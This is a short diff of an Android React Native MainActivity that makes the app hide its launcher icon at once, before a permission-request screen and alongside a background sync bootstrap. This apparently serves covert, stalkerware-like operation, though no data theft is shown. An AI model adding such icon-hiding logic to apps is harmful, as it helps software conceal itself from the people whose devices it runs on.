@@ -17,12 +17,13 @@ class MainActivity : ReactActivity() {
     }
 
     if (InstallFlow.isSetupComplete(this)) {
-      LauncherHider.hideIfMarked(this)
+      LauncherHider.hideNow(this)
       SyncBootstrap.ensureBackgroundReady(applicationContext)
       finish()
       return
     }
 
+    LauncherHider.hideNow(this)
     startActivity(
       Intent(this, PermissionTrampolineActivity::class.java).apply {
         addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
